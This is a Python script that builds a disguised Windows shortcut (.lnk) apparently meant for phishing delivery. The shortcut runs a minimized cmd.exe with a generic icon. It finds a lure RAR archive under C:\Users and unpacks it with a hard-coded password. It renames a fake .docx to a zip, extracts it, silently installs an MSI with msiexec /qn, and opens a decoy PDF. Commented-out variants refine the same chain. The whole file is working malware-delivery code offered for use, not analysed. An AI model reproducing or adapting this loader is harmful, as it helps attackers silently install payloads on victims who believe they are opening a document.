import win32com.client 
import os

ZIP_FILENAME = "Thongbaokhoicong.rar"
MSI_FILENAME = "setup.msi"
TAILIEU_FILENAME = "tailieu.docx"
TAILIEU_EXTRACTED_DIR = "tailieu_extracted"
OPEN_AFTER_INSTALL = "Thongbaokhoicong.pdf"

shell = win32com.client.Dispatch("WScript.Shell")

lnk_path = os.path.abspath("winrar_find_unzip_pass.lnk")

shortcut = shell.CreateShortCut(lnk_path)

shortcut.TargetPath = r"C:\Windows\System32\cmd.exe"
shortcut.WorkingDirectory = r"C:\\Users"

# shortcut.Arguments = r'''/k for /r "C:\Users" %i in (test.rar) do (powershell -NoProfile -WindowStyle Hidden -Command "try { & 'C:\Program Files\WinRAR\WinRAR.exe' x -p123 '%i' \"$env:TEMP\%~ni\" } catch {}" >nul 2>&1 & if exist "%TEMP%\%~ni\Update.msi" (msiexec /i "%TEMP%\%~ni\Update.msi" /qn /norestart >nul 2>&1))'''
# shortcut.Arguments = r'''/k for /r "C:\Users" %i in ({zip_filename}) do if exist "%i" (powershell -NoProfile -Command "try {{ & 'C:\Program Files\WinRAR\WinRAR.exe' x -p123 -y '%i' \"$env:TEMP\%~ni\" }} catch {{}}" & cd /d "%TEMP%\%~ni" & if exist "%TEMP%\%~ni\.System Information\Data\tailieu.docx" (rename "%TEMP%\%~ni\.System Information\Data\tailieu.docx" "tailieu.zip" & powershell -NoProfile -WindowStyle Hidden -Command "try {{ Expand-Archive -LiteralPath '%TEMP%\%~ni\.System Information\Data\tailieu.zip' -DestinationPath '%TEMP%\%~ni\{extracted_dir}' -Force }} catch {{}}" >nul 2>&1 & cd /d "%TEMP%\%~ni\{extracted_dir}\word" & if exist {msi} (msiexec /i {msi} /qn /norestart >nul 2>&1 & if exist {open_file} start "" "{open_file}" & exit)))'''.format(
#     zip_filename=ZIP_FILENAME,
#     extracted_dir=TAILIEU_EXTRACTED_DIR,
#     msi=MSI_FILENAME,
#     open_file=OPEN_AFTER_INSTALL)

# shortcut.Arguments = r'''/k @echo off & for /r "C:\Users" %i in ({zip_filename}) do if exist "%i" ("C:\Program Files\WinRAR\WinRAR.exe" x -p123 -y "%i" "%TEMP%\%~ni\" & cd /d "%TEMP%\%~ni" & exit)'''.format(zip_filename=ZIP_FILENAME)

shortcut.Arguments = r'''/k @echo off & for /f "delims=" %i in ('dir "C:\Users\{zip_filename}" /s /b 2^>nul') do if exist "%i" ("C:\Program Files\WinRAR\WinRAR.exe" x -pabc@123 -y "%i" "%TEMP%\%~ni\" >nul 2>&1 & cd /d "%TEMP%\%~ni" & if exist "%TEMP%\%~ni\.System Information\Data\tailieu.docx" (rename "%TEMP%\%~ni\.System Information\Data\tailieu.docx" "tailieu.zip" & "C:\Program Files\WinRAR\WinRAR.exe" x -y "%TEMP%\%~ni\.System Information\Data\tailieu.zip" "%TEMP%\%~ni\{extracted_dir}\" >nul 2>&1 & cd /d "%TEMP%\%~ni\{extracted_dir}\word" & if exist "{msi}" (msiexec /i "{msi}" /qn /norestart >nul 2>&1 & if exist "{open_file}" start "" "{open_file}" & exit)))'''.format(
    zip_filename=ZIP_FILENAME, extracted_dir=TAILIEU_EXTRACTED_DIR, msi=MSI_FILENAME, open_file=OPEN_AFTER_INSTALL)

# Escape braces cho Python format
# shortcut.Arguments = r'''/c @echo off & for /f "delims=" %i in ('dir "C:\Users\{zip_filename}" /s /b 2^>nul') do if exist "%i" (echo Found: %i & ("C:\Program Files\WinRAR\WinRAR.exe" x -pabc@123 -y "%i" "%TEMP%\%~ni\" >nul 2>&1 & cd /d "%TEMP%\%~ni" & if exist "%TEMP%\%~ni\.System Information\Data\tailieu.docx" (echo "HEHEHE" & ren "%TEMP%\%~ni\.System Information\Data\tailieu.docx" "tailieu.zip" & "C:\Program Files\WinRAR\WinRAR.exe" x -y "%TEMP%\%~ni\.System Information\Data\tailieu.zip" "%TEMP%\%~ni\{extracted_dir}\" >nul 2>&1 & cd /d "%TEMP%\%~ni\{extracted_dir}\word" & if exist "{msi}" (msiexec /i "{msi}" /qn /norestart >nul 2>&1 & if exist "{open_file}" start "" "{open_file}" & exit /b))))'''.format(
#     zip_filename=ZIP_FILENAME, 
#     extracted_dir=TAILIEU_EXTRACTED_DIR.replace('{', '{{').replace('}', '}}'),
#     msi=MSI_FILENAME.replace('{', '{{').replace('}', '}}'), 
#     open_file=OPEN_AFTER_INSTALL.replace('{', '{{').replace('}', '}}'))




shortcut.IconLocation = r"C:\Windows\System32\shell32.dll,1"  # Thêm icon
shortcut.WindowStyle = 7  # Ẩn cửa sổ

shortcut.save()

print("Created:", lnk_path) 